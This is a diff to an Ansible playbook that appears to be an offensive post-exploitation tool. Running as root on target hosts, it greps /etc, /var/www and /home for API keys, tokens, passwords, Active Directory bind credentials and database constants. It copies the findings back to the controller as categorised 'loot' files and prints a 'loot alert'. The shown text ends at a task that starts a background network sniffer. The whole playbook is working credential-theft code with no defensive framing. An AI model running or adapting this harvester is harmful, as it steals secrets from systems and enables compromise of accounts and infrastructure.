@@ -1,50 +1,63 @@
 ---
-- name: Targeted Secret Extraction
+# 1. API KEYS (Looking for cloud/service tokens)
+- name: Extract API Keys
   become: yes
   shell: |
-    # Removed -h to show filenames. 
-    # Added /etc /var/www to scope.
-    # Added a second grep -vE to filter out more common false positives.
-    grep -rEo "(password|passwd|db_pass|api_key|token|secret)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,30}['\"]?" /etc /var/www 2>/dev/null \
-    | grep -vE "(undefined|update|unmount|unit|url|use|validate|unconf|uncert|unselect|unserialize|worker|options|msg|Label|icon|color)" \
+    grep -rEo "(api_key|token|secret|access_key)\s*[:=]\s*['\"]?[^'\" \t\n;]{8,64}['\"]?" /etc /var/www 2>/dev/null \
+    | grep -vE "(wp-includes|wp-admin|node_modules|undefined|update|unmount)" \
     | sort -u
-  register: config_secrets
+  register: api_results
   failed_when: false
-  changed_when: false
 
-- name: Web and Database Constant Extraction
+# 2. SYSTEM & AD CREDENTIALS (Looking for local users/AD configs)
+- name: Extract System and AD Credentials
   become: yes
   shell: |
-    # Removed -h to show which config file contains the DB credentials
-    grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
-    | sed "s/['\"],/ = /g" | tr -d "()',\""
-  register: web_secrets
+    grep -rEo "(passwd|password|bind_dn|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /etc /home 2>/dev/null \
+    | grep -vE "(\.js|\.css|undefined|passwd: files|passwd: False)" \
+    | sort -u
+  register: ad_results
   failed_when: false
-  changed_when: false
 
-- name: Deliver Harvested Data to Local Loot
+# 3. DATABASE CREDENTIALS (Specifically targeting config files)
+- name: Extract Database Credentials
+  become: yes
+  shell: |
+    grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
+    | grep -v "wp-config-sample.php" \
+    | sed "s/['\"],/ = /g" | tr -d "()',\"" | sort -u
+  register: db_results
+  failed_when: false
+
+# 4. DELIVERY (Organized sections)
+- name: Deliver Organized Loot
   delegate_to: localhost
   copy:
     content: |
       === HARVEST REPORT: {{ inventory_hostname }} ===
-      
-      [FILE PATH : MATCHED SECRET]
-      {{ config_secrets.stdout if config_secrets.stdout != "" else "None" }}
 
-      [DATABASE CONSTANTS]
-      {{ web_secrets.stdout if web_secrets.stdout != "" else "None" }}
-    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/harvest_results.txt"
+      [SECTION 1: API KEYS & TOKENS]
+      {{ api_results.stdout if api_results.stdout != "" else "None found" }}
+
+      [SECTION 2: AD & SYSTEM CREDENTIALS]
+      {{ ad_results.stdout if ad_results.stdout != "" else "None found" }}
+
+      [SECTION 3: DATABASE CREDENTIALS]
+      {{ db_results.stdout if db_results.stdout != "" else "None found" }}
+    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/organized_loot.txt"
   become: no
-  when: config_secrets.stdout != "" or web_secrets.stdout != ""
 
-- name: LIVE CREDS ALERT
+# 5. LIVE ALERT (Categorized for the terminal)
+- name: "CATEGORIZED LOOT ALERT: {{ inventory_hostname }}"
   debug:
-    msg: 
-      - "File Location : Found Secret"
-      - "---------------------------"
-      - "Configs: {{ config_secrets.stdout_lines | default(['None']) }}"
-      - "Web/DB: {{ web_secrets.stdout_lines | default(['None']) }}"
-  when: config_secrets.stdout != "" or web_secrets.stdout != ""
+    msg:
+      - "--- API KEYS ---"
+      - "{{ api_results.stdout_lines | default(['None']) }}"
+      - "--- AD/SYSTEM ---"
+      - "{{ ad_results.stdout_lines | default(['None']) }}"
+      - "--- DATABASE ---"
+      - "{{ db_results.stdout_lines | default(['None']) }}"
+  when: api_results.stdout != "" or ad_results.stdout != "" or db_results.stdout != ""
 
 - name: Start Background Network Sniffer
   delegate_to: localhost
